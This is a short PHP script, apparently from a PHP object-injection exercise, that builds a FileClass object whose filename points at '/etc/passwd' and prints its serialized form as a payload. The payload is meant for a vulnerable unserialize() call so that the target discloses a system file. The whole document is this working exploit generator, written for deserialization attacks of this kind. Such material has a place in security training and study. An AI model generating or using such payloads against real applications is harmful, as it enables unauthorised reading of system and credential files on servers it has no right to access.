<?php
include 'unserialize_can_read_file.php';  
$fileobj = new FileClass();  
$fileobj->filename = '/etc/passwd';  
echo "<br>serialize output:<br>";
print serialize($fileobj);
?>
